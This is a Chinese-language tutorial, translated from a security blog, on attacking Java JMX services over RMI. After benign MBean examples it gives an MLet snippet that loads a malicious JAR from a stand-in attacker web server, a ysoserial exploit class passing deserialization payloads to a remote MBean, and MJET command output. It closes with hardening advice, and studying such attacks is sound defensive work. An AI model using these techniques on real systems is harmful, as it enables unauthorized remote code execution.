## JMX RMI远程代码执行漏洞

### 1. JMX

JMX（Java Management Extensions，即Java管理扩展）是一个为应用程序、设备、系统植入管理功能的框架，JMX的核心类是MBean(准确说是接口)，用于监视基于Java的应用程序。JMX最常见的用例是通过Nagios、Zabbix或lcinga等监控解决方案监视java应用程序服务的可用性和性能。  

#### JMX基础类

JMX允许您将资源作为托管Bean进行管理。托管bean（MBean）是一个Java Bean类，它遵循JMX标准的某些设计规则。MBean可以代表需要通过JMX管理的设备，应用程序或任何资源。您可以通过JMX访问这些MBean，查询属性并调用Bean方法。  

JMX标准在各种MBean类型之间有所不同，但是，我们在这里仅处理标准MBean。要成为有效的MBean，Java类必须：  

- 实施接口
- 提供默认的构造函数（不带任何参数）
- 遵循某些命名约定，例如，实现getter / setter方法以读取/写入属性

如果要创建自己的MBean，首先需要定义一个接口。这是“ Hello world” MBean中的一个最小示例：    

	package de.mogwailabs.MBeans;

	public interface HelloMBean {

    	// getter and setter for the attribute "name"
    	public String getName();
    	public void setName(String newName);
	
    	// Bean method "sayHello"
    	public String sayHello();	
	}
	
下一步是为定义的接口提供实现。该名称应始终与接口相同，但没有MBean部分:  

	package de.mogwailabs.MBeans;

	public class Hello implements HelloMBean {

    	private String name = "MOGWAI LABS";

    	// getter/setter for the "name" attribute
    	public String getName() { return this.name; }
    	public void setName(String newName) { this.name = newName; }

    	// Methods
    	public String sayHello() { return "hello: " + name; }
	}
	

#### MBean服务器 

MBean服务器是管理系统MBean的服务。开发人员可以按照特定的命名模式在服务器中注册其MBean。MBean服务器将传入消息转发到已注册的MBean。该服务还负责将消息从MBean转发到外部组件。  

默认情况下，每个Java进程都在运行一个MBean服务器服务，我们可以使用访问该服务ManagementFactory.getPlatformMBeanServer();。以下示例代码“连接”到当前进程的MBean服务器并打印出所有已注册的MBean：  

	package de.mogwailabs.MBeanClient;

	import java.lang.management.ManagementFactory;
	import javax.management.*;

	public class MBeanClient {

		public static void main(String[] args) throws Exception {
		
        	// Connect to the MBean server of the current Java process
       	 MBeanServer server = ManagementFactory.getPlatformMBeanServer();
        	System.out.println( server.getMBeanCount() );

        	// Print out each registered MBean
        	for ( Object object : server.queryMBeans(new ObjectName("*:*"), null) ) {
           	System.out.println( ((ObjectInstance)object).getObjectName() );
        	}
    	}
	}
	
如果我们想使MBean的实例在MBean服务器上可调用，则需要向一个ObjectName类注册它。每个MBean都需要遵循对象名称约定的唯一名称。该名称分为域（通常是包）和对象名称，在本地MBean服务器上注册MBean的示例：  

	package de.mogwailabs.MBeanExample;

	import de.mogwailabs.MBeans.*;
	import java.lang.management.ManagementFactory;
	import javax.management.*;

	public class MBeanExample {

		public static void main(String[] args) throws Exception {
		
			// Create a new MBean instance from Hello (HelloMBean interface)
			Hello mbean = new Hello();
		
			// Create an object name, 
			ObjectName mbeanName = new ObjectName("de.mogwailabs.MBeans:type=HelloMBean");
		
			// Connect to the MBean server of the current Java process
			MBeanServer server = ManagementFactory.getPlatformMBeanServer();
			server.registerMBean(mbean, mbeanName);
		
			// Keep the application running until user enters something
			System.out.println("Press any key to exit");
			System.in.read();	
		}
	} 
	
#### JCONSOLE
访问MBean / JMX服务的最简单方法是使用JDK中的“ jconsole”工具。启动后，您可以连接到正在运行的Java进程，并在“ MBean”选项卡中检查已注册的MBean。也可以获取/设置bean属性或调用诸如我们的“ sayHello”方法之类的方法。  

#### JMX连接器 

到目前为止，我们仅连接到我们自己的MBean服务器实例。如果要连接到在另一台服务器上运行的远程实例，则必须使用JMX连接器。JMX连接器基本上是一个客户端/服务器存根，用于提供对远程MBean服务器的访问。这是通过遵循经典的RPC（远程过程调用）方法来完成的，该方法试图向开发人员隐藏“远程”部分，包括用于与远程实例通信的协议。   

默认情况下，Java提供基于Java RMI（远程方法调用）的远程JMX连接器。您可以通过将以下参数添加到java调用来启用JMX。  

	-Dcom.sun.management.jmxremote.port=2222 -Dcom.sun.management.jmxremote.authenticate=false -Dcom.sun.management.jmxremote.ssl=false 

这是我们的MBean服务器的示例（导出到jar文件）：  

	java -Dcom.sun.management.jmxremote.port=2222 -Dcom.sun.management.jmxremote.authenticate=false -Dcom.sun.management.jmxremote.ssl=false -jar mbeanserver.jar 

如果现在在系统上执行端口扫描，则可以看到TCP端口2222实际上托管了一个RMI命名注册表，该注册表公开了一个名称为“ jmxrmi”的对象。可以在TCP端口34041上访问实际的RMI服务。在启动过程中会随机选择此端口号。如果您想了解有关Java RMI的更多信息，可以浏览https://mogwailabs.de/blog/2019/03/attacking-java-rmi-services-after-jep-290/。  

	nmap 192.168.71.128 -p 2222,34041 -sVC

	Starting Nmap 7.60 ( https://nmap.org ) at 2019-04-08 20:02 CEST
	Nmap scan report for rocksteady (192.168.71.128)
	Host is up (0.00024s latency).

	PORT      STATE SERVICE     VERSION
	2222/tcp  open  java-rmi    Java RMI Registry
	| rmi-dumpregistry: 
	|   jmxrmi
	|      implements javax.management.remote.rmi.RMIServer, 
	|     extends
	|       java.lang.reflect.Proxy
	|       fields
	|           Ljava/lang/reflect/InvocationHandler; h
	|             java.rmi.server.RemoteObjectInvocationHandler
	|             @127.0.1.1:34041
	|             extends
	|_              java.rmi.server.RemoteObject
	34041/tcp open  rmiregistry Java RMI
	
	Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
	Nmap done: 1 IP address (1 host up) scanned in 11.95 seconds

### 2. JMX常见的问题  

在RMI上运行了可运行的JMX服务之后，攻击者可以通过各种方式来攻击该服务，另外不安全的MBean暴露，也导致严重的安全问题。  

#### 滥用MBean 
如前面的示例所示，应用程序能够注册其他MBean，然后可以对其进行远程调用。JMX通常用于管理应用程序，因此MBean通常非常强大。以下屏幕快照显示了由Tomcat应用程序服务器注册的UserDatabase MBean中的方法。该MBean允许检查已配置的Tomcat用户/组，甚至创建新帐户。攻击者可能滥用此MBean来泄露配置的密码，或为基于Web的Tomcat管理器创建新的管理员。  
![](https://github.com/shadow-horse/VulnerabilityAnalysis/blob/master/JMX%20RMI%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/jconsole_tomcat.png)

Tomcat进一步允许您通过JMX查看所有SessionID，这些ID可用于破坏活动的Web会话。  
![](https://github.com/shadow-horse/VulnerabilityAnalysis/blob/master/JMX%20RMI%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/jconsole_sessionids.png)

#### 利用MLETS执行远程代码

这种攻击技术已于2013年在Braden Thomas 的博客文章[“利用JMX RMI中进行了首次描述”](https://www.optiv.com/blog/exploiting-jmx-rmi)，并且在未启用JMX身份验证的情况下仍可在大多数环境中使用。  

该危害不仅限于执行、调用您定义的MBean，远程客户端可以创建javax.management.loading.MLet MBean并使用它从任意URL创建新的MBean，使您的Java应用程序执行任意代码。  

MLet是管理applet的快捷方式，允许注册一个或多个来自远程URL的MBeans。可以简单理解为，MLET类似一个HTML文件，如：  
	
	<html><mlet code="de.mogwailabs.MaliciousMLet" archive="mogwailabsmlet.jar" name="Mogwailabs:name=payload" codebase="http://attackerwebserver"></mlet></html>
	
攻击包括以下步骤：

1. 启动承载带有恶意MBean的MLet和JAR文件的Web服务器
2. 使用JMX在目标服务器上创建MBean javax.management.loading.MLet的实例
3. 调用MBean实例的“ getMBeansFromURL”方法，并将Web服务器URL作为参数传递。JMX服务将连接到http服务器并解析MLet文件。
4. JMX服务下载并加载MLet文件中引用的JAR文件，从而使恶意MBean可通过JMX使用。
5. 攻击者调用恶意MBean方法。
 
这听起来很复杂，但是有很多现成的工具利用，如[metasploite模块](https://www.rapid7.com/db/modules/exploit/multi/misc/java_jmx_server)或[MJET工具](https://github.com/shadow-horse/mjet)  

只要满足以下要求，此方法就非常可靠：

1. JMX服务器可以连接到由攻击者控制的http服务。这是在目标服务器上加载恶意MBean所必需的。
2. 未启用JMX身份验证（启用身份验证不仅可以通过凭证来保护JMX服务，而且还具有副作用，即不再可能调用“ getMBeansFromURL”）

#### JMS/MBEANS级别的反序列化

由于JMX RMI基于RMI，因此攻击者还可以尝试在RMI级别利用反序列化漏洞。这可以通过使用Moritz Bechler的以下两个漏洞来完成，这些漏洞是[Ysoserial工具包的一部分](https://github.com/frohoff/ysoserial)。   

尽管不再可能直接在RMI上利用反序列化，但是攻击者仍可以尝试在应用程序级别利用反序列化漏洞。基本思想是调用一个MBean方法，该方法接受一个String（或任何其他类）作为参数。正如我们在前面的示例中已经看到的那样，默认情况下，每个Java进程已经提供了几个MBean。一个好的候选方法是“ getLoggerLevel”方法，该方法接受String作为参数。  
![](https://github.com/shadow-horse/VulnerabilityAnalysis/blob/master/JMX%20RMI%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/jconsole_getloggerlevel.png)
攻击者无需传递字符串，而只需传递恶意对象作为参数即可。JMX使这相当容易，因为MBeanServerConnection.invoke被用于调用远程MBean方法方法需要通过两个阵列，一个与所述的参数和一个用参数签名。  

	package ysoserial.exploit;

	import javax.management.MBeanServerConnection;
	import javax.management.ObjectName;
	import javax.management.remote.JMXConnector;
	import javax.management.remote.JMXConnectorFactory;
	import javax.management.remote.JMXServiceURL;

	import ysoserial.payloads.ObjectPayload.Utils;

	/*
	 * Utility program for exploiting RMI based JMX services running with required gadgets available in their ClassLoader.
 	* Attempts to exploit the service by invoking a method on a exposed MBean, passing the 	payload as argument.
 	* 
 	*/
	public class JMXInvokeMBean {

		public static void main(String[] args) throws Exception {
	
			if ( args.length < 4 ) {
				System.err.println(JMXInvokeMBean.class.getName() + " <host> <port> <payload_type> <payload_arg>");
				System.exit(-1);
			}
    	
			JMXServiceURL url = new JMXServiceURL("service:jmx:rmi:///jndi/rmi://" + args[0] + ":" + args[1] + "/jmxrmi");
        
			JMXConnector jmxConnector = JMXConnectorFactory.connect(url);
			MBeanServerConnection mbeanServerConnection = jmxConnector.getMBeanServerConnection();

			// create the payload
			Object payloadObject = Utils.makePayloadObject(args[2], args[3]);   
			ObjectName mbeanName = new ObjectName("java.util.logging:type=Logging");

			mbeanServerConnection.invoke(mbeanName, "getLoggerLevel", new Object[]{payloadObject}, new String[]{String.class.getCanonicalName()});

			//close the connection
			jmxConnector.close();
    	}
	}


具有在启用身份验证的情况下工作的优势（如果已知有效凭据）。该服务在其类路径中仍需要具有可利用的小工具，但与基于MLET的攻击不同，它不需要从JMX服务器到攻击者控制的http服务的传出连接。  

	h0ng10@rocksteady ~/w/mjet> jython mjet.py --jmxrole user --jmxpassword userpassword 10.165.188.23 2222 deserialize CommonsCollections6 "touch /tmp/xxx"

	MJET - MOGWAI LABS JMX Exploitation Toolkit
	===========================================
	[+] Added ysoserial API capacities
	[+] Connecting to: service:jmx:rmi:///jndi/rmi://10.165.188.23:2222/jmxrmi
	[+] Using credentials: user / userpassword
	[+] Connected: rmi://10.165.188.1 user 21
	[+] Loaded sun.management.ManagementFactoryHelper$PlatformLoggingImpl
	[+] Passing ysoserial object as parameter to getLoggerLevel(String loglevel)
	[+] Got an access denied exception - this is expected

	[+] Done
	
### 3. 基于Solr JMX远程代码执行漏洞进行验证  

验证过程，请见：  

### 4. JMX安全总结 

通过启用身份验证来保护JMX服务非常重要，否则，它可能会成为攻击者的轻松目标。JMX标准已经提供了此功能，包括对TLS加密连接的支持。在这里可以找到有关如何保护这些JMX环境的良好描述。

除了启用身份验证之外，还应确保JDK环境是最新的，否则攻击者可能会尝试使用Java反序列化来利用底层RMI实现，即使启用身份验证也可以做到这一点。

攻击者可能仍会以某种方式获得对JMX服务的有效凭据的访问权限。在这种情况下，即使他只有一个“ readOnly”帐户，他仍然可以尝试利用Java反序列化。可以通过实施全球JEP290政策来防止这种情况。  

### 参考

基本是翻译以下链接内容，权当学习： 
https://mogwailabs.de/blog/2019/04/attacking-rmi-based-jmx-services/  








	